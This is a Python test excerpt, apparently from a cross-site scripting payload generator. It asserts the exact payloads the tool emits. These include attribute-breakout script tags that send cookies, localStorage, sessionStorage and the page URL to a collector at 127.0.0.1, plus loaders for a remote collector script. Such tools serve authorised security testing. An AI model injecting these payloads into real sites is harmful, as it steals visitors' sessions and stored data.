...
def test_generate_payload(client):
    ...
    rv = generate_payload(client, 1, url='http://127.0.0.1', stored=1, cookies=1,
                          local_storage=1, session_storage=1, code='html', geturl=1, customParam='test', customParam2='test2')
    expected_response = '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/{}?cookies="+encodeURIComponent(document.cookie)+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"&origin_url="+encodeURIComponent(location.href)+"&customParam=test&customParam2=test2"</script>'.format(client_name1.uid)
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1, code='js',
                          i_want_it_all=1, url='http://127.0.0.1')
    expected_response = ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){sendData("http://127.0.0.1/api/x/r/' + \
        client_name1.uid + '","")};document.body.appendChild(js);'
    assert str.encode(expected_response) in rv.data
    ...
    expected_response = ';};new Image().src="http://127.0.0.1/api/x/r/' + \
        client_name1.uid + '";'
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1, url='http://127.0.0.1',
                          code='html', i_want_it_all=1)
    expected_response = '\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("http://127.0.0.1/api/x/r/' + \
        client_name1.uid + '", "")</script>'
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1, url='http://127.0.0.1', code='html')
    expected_response = '\'>"><img src="http://127.0.0.1/api/x/r/{}" />'.format(
        client_name1.uid)
    assert str.encode(expected_response) in rv.data
